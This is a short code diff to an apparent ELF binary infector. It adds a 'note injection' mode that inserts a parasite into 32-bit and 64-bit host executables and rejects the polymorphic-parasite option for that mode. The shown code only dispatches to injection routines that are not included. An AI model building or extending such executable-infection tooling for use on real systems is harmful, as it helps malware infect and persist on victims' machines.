@@ -112,6 +112,16 @@ int elfit32(opts_t *opts)
             printf("[+ INJECTING RELOCATABLE]\n");
             printf("chosen injection method not yet implemented\n");
             exit(1);
+        case NOTE_INJECT:
+            printf("[+ INJECTING NOTE]\n");
+            malpoint = note_inject_32(&host, &parasite);
+            reload_host(opts->host, &host);
+            if(opts->polymorphic_key)
+            {
+                printf("Polymorphic parasite not impolemented for note injection\n");
+                exit(1);
+            }
+            break;
     }
 
     printf("[+] Parasite at 0x%lx-0x%lx\n", malpoint, malpoint + parasite.file->st_size);
@@ -252,6 +262,16 @@ int elfit64(opts_t *opts)
             printf("[+ INJECTING RELOCATABLE]\n");
             printf("chosen injection method not yet implemented\n");
             exit(1);
+        case NOTE_INJECT:
+            printf("[+ INJECTING NOTE]\n");
+            malpoint = note_inject_64(&host, &parasite);
+            reload_host(opts->host, &host);
+            if(opts->polymorphic_key)
+            {
+                printf("Polymorphic parasite not impolemented for note injection\n");
+                exit(1);
+            }
+            break;
         default:
             printf("[-] no injection technique chosen\n");
     }
@@ -319,7 +339,7 @@ int main(int argc, char *argv[])
     }
     else
     {
+        printf("Unkown elf class: %d\n", elf_class);
         return -1;
     }
 }
-
